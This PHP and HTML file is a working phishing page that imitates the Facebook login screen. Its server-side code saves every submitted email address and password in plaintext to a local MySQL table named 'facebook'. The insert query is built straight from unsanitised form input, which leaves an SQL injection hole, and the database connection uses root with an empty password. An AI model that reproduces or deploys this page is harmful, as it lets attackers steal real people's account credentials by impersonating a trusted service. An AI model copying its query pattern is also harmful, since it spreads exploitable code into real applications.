<?php
// database
$servername = "localhost";
$username = "root";
$password = "";
$database = "facebook";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);

// Check connection
if (!$conn) {
    die("Sorry, we failed to connect: " . mysqli_connect_error());
}

// insertion
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST["email"]; // post data from form
    $pass = $_POST["password"]; // post data from form
    $sql = "INSERT INTO `facebook` (`email`,`pass`) VALUES ('$email','$pass')"; // insert query
    $result = mysqli_query($conn, $sql); // query run
}

?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Facebook</title>
    <link rel="stylesheet" href="./css/styles.css">
    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
</head>

<body>
    <main>
        <div class="main">
            <div class="heading-section">
                <img src="./images/logo.png" class="logo-img">
                <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
            </div>

            <div class="form">

                <form class="a-form" action="" method="POST">
                    <!-- post method -->
                    <input type="text" id="Email" class="a-email" name="email" placeholder="Email address or phone number" />
                    <input type="password" id="Password" class="a-pss" name="password" placeholder="Password" autofocus="autofocus" />
                    <input type="submit" class="a-sub" value="Log In" />
                    <a href="" class="a-link">Forgotten password?</a>
                    <hr class="a-hr">
                    <input type="submit" value="Create New Account" class="a-but" />
                </form>
                <div class="create-page">
                    <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
                </div>
            </div>
        </div>

    </main>
    <div class="footer">
        <!-- ... (rest of your HTML code) ... -->
    </div>
    <div class="m-footer">
        <!-- ... (rest of your HTML code) ... -->
    </div>
</body>

</html>
